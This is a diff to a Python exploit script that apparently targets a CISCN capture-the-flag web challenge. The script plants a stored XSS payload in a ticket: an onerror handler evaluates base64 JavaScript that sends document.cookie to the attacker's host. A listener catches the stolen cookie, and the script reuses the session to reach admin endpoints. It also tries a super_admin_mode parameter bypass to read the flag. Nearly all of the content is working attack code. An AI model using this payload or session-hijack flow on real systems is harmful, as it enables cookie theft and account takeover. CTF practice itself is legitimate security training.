@@ -106,21 +106,29 @@ class WebExp:
         print "[+] Register Success."
         return True
 
-    def exp(self):
-
+    def exp(self,ip=None):
+        
         # get local ip address
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(('8.8.8.8', 80))
-        ip = s.getsockname()[0]
-        print ip
+        if not ip:
+            ip = s.getsockname()[0]
+        print 'please check your ip:',ip
         s.close()
 
         self.register_test()
         self.login_test()
 
+        sol2=re.search('CISCN\\{.*?}',self.session.get(self.url+'user/2?super_admin_mode=1').text)
+        if sol2:
+            print 'exp2:',sol2.group()
+            # return True
+        else:
+            print 'exp2 fixed'
+
         rs = self.session.get(self.url + 'tickets')
         payload='b=document.cookie;a="<img src=http://{}:8234/"+btoa(b)+">";document.write(a);'.format(ip)
-        payload=base64.b16encode(payload)
+        payload=base64.b64encode(payload)
         #token = self._get_token(rs.text)
         payload = '![dsa](x"onerror=eval(atob(\'{}\'))%")'.format(payload)
         #print self.url + 'tickets/create'
@@ -134,7 +142,7 @@ class WebExp:
         })
 
         s = socket.socket()
-        s.bind(("127.0.0.1", 8234))
+        s.bind(("0.0.0.0", 8234))
         s.listen(5)
         print("start listening ...")
         while True:
@@ -142,6 +150,7 @@ class WebExp:
             buf=con.recv(1024)
             if 'GET' in buf:
                 break
+        s.close()
         cookie=re.search(r'/\w+=*\s',buf).string
         cookie=cookie.strip().split('/')[1]
         cookie=base64.b64decode(cookie)
@@ -174,27 +183,32 @@ class WebExp:
             '''
         })
         #print rs.text
-        print "soluntion1:"+self.session.get(self.url+'user/check/regen').text
-        print "soluntion2:"+self.session.get(self.url+'user/2?super_admin_mode=1').text
-        return True
+        # print self.session.get(self.url+'user/check/regen').text
+        sol1=re.search('CISCN\\{.*?}',self.session.get(self.url+'user/check/regen').text)
+       
+        if sol1:
+            print 'exp1:',sol1.group()
+        else:
+            print 'exp1 fixed'
+        if sol1 or sol2:
+            return True
+        else:
+            return False
 
-def exp(host, port):
+def exp(host, port,self_ip=None):
     exploit = WebExp(str(host), str(port), "_xsrf")
-    return exploit.exp()
+    return exploit.exp(ip=self_ip)
 
 if __name__ == '__main__':
-    '''
-    if len(sys.argv) != 4:
-        print("Wrong Params")
-        print("example: python %s %s %s" % (sys.argv[0], '127.0.0.1', '8233'))
+    
+    if len(sys.argv) < 3:
+        print("Wrong Params(attack ip, attack port, [your ip])")
+        print("example: python %s %s %s" % (sys.argv[0], '192.168.94.233', '80'))
         exit(0)
-    ip = sys.argv[1]
+    server = sys.argv[1]
     port = sys.argv[2]
-    exp(ip, port)
-    '''
-    exp("localhost", 8233)
-
-
-
-
+    if len(sys.argv)==4:
+        print exp(server, port,self_ip=sys.argv[3])
+    else:
+        print exp(server,port)
 
